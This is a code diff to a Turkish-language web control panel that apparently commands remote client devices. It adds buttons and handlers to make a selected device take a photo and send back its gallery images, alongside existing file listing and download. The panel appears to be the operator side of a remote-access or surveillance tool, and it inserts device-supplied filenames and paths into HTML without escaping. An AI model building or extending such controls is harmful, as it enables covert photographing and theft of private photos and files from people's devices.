@@ -63,6 +63,12 @@
                         <button class="btn btn-info" onclick="listFiles()">
                             📁 Dosyaları Listele
                         </button>
+                        <button class="btn btn-photo" onclick="capturePhoto()">
+                            📷 Fotoğraf Çek
+                        </button>
+                        <button class="btn btn-gallery" onclick="getGallery()">
+                            🖼️ Galeri Göster
+                        </button>
                         <button class="btn btn-warning" onclick="refreshClients()">
                             🔄 Cihazları Yenile
                         </button>
@@ -112,6 +118,16 @@
         socket.on('file_download_result', function(data) {
             console.log('File download result received:', data);
             showResult('download', data);
+        });
+
+        socket.on('photo_result', function(data) {
+            console.log('Photo result received:', data);
+            showResult('photo', data);
+        });
+
+        socket.on('gallery_photos_result', function(data) {
+            console.log('Gallery photos result received:', data);
+            showResult('gallery', data);
         });
 
         function refreshClients() {
@@ -249,6 +265,52 @@
             });
         }
 
+        function capturePhoto() {
+            const clientId = getSelectedClient();
+            if (!clientId) return;
+
+            fetch('/send_command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    client_id: clientId,
+                    command: 'capture_photo'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                showResult('command', { message: 'Fotoğraf çekme komutu gönderildi' });
+            })
+            .catch(error => {
+                showResult('error', { message: 'Komut gönderilirken hata oluştu' });
+            });
+        }
+
+        function getGallery() {
+            const clientId = getSelectedClient();
+            if (!clientId) return;
+
+            fetch('/send_command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    client_id: clientId,
+                    command: 'get_gallery'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                showResult('command', { message: 'Galeri fotoğrafları komutu gönderildi' });
+            })
+            .catch(error => {
+                showResult('error', { message: 'Komut gönderilirken hata oluştu' });
+            });
+        }
+
         function showResult(type, data) {
             const resultsContent = document.getElementById('results-content');
             const timestamp = new Date().toLocaleTimeString();
@@ -379,6 +441,54 @@
                                 <p><strong>📄 Dosya Adı:</strong> ${data.filename}</p>
                                 <p><strong>📏 Boyut:</strong> ${Math.round(data.file_data.length * 0.75 / 1024)} KB</p>
                                 <button class="btn btn-success" onclick="downloadToDevice('${data.filename}', '${data.file_data}')">💾 Bilgisayara İndir</button>
+                            </div>
+                         </div>`;
+            } else if (type === 'photo' && data.error) {
+                html += `<div class="result-summary">
+                            <span class="result-icon">📷</span>
+                            <span>Fotoğraf çekme yanıtı</span>
+                         </div>`;
+                html += `<div class="result-details">
+                            <div class="photo-error">
+                                <p><strong>❌ Bilgi:</strong> ${data.error}</p>
+                                <p><strong>💡 Öneri:</strong> ${data.suggestion || 'Galeri fotoğraflarını görüntülemek için "Galeri Göster" butonunu kullanın'}</p>
+                            </div>
+                         </div>`;
+            } else if (type === 'gallery' && data.photos) {
+                const photoCount = data.photos.length;
+                html += `<div class="result-summary">
+                            <span class="result-icon">🖼️</span>
+                            <span>${photoCount} fotoğraf bulundu</span>
+                         </div>`;
+                html += `<div class="result-details">
+                            <div class="gallery-container">
+                                <div class="gallery-stats">
+                                    <p><strong>📊 Toplam Fotoğraf:</strong> ${photoCount}</p>
+                                    <p><strong>ℹ️ Not:</strong> Son 5 fotoğraf gösteriliyor</p>
+                                </div>
+                                <div class="gallery-grid">`;
+                
+                data.photos.forEach((photo, index) => {
+                    const fileSize = Math.round(photo.data.length * 0.75 / 1024);
+                    const dateAdded = new Date(photo.date_added * 1000).toLocaleString();
+                    
+                    html += `<div class="gallery-item">
+                                <div class="gallery-image">
+                                    <img src="data:image/jpeg;base64,${photo.data}" alt="${photo.name}" onclick="openImageModal(this)">
+                                </div>
+                                <div class="gallery-info">
+                                    <p class="photo-name">${photo.name}</p>
+                                    <p class="photo-size">${fileSize} KB</p>
+                                    <p class="photo-date">${dateAdded}</p>
+                                    <div class="photo-actions">
+                                        <button class="btn btn-mini" onclick="downloadPhotoToDevice('${photo.name}', '${photo.data}')">💾 İndir</button>
+                                        <button class="btn btn-mini" onclick="copyPhotoInfo('${photo.name}', '${photo.path}')">📋 Bilgi</button>
+                                    </div>
+                                </div>
+                             </div>`;
+                });
+                
+                html += `       </div>
                             </div>
                          </div>`;
             } else {
@@ -546,6 +656,38 @@
                 console.error('Download error:', error);
                 alert('Dosya indirilirken hata oluştu');
             }
+        }
+
+        function downloadPhotoToDevice(filename, imageData) {
+            try {
+                const byteCharacters = atob(imageData);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], { type: 'image/jpeg' });
+                
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                a.click();
+                URL.revokeObjectURL(url);
+            } catch (error) {
+                console.error('Photo download error:', error);
+                alert('Fotoğraf indirilirken hata oluştu');
+            }
+        }
+
+        function copyPhotoInfo(name, path) {
+            const info = `Fotoğraf Adı: ${name}\nDosya Yolu: ${path}`;
+            navigator.clipboard.writeText(info).then(() => {
+                alert('Fotoğraf bilgileri kopyalandı!');
+            }).catch(err => {
+                console.error('Copy error:', err);
+                alert('Kopyalama sırasında hata oluştu');
+            });
         }
 
         // Sayfa yüklendiğinde cihazları yenile
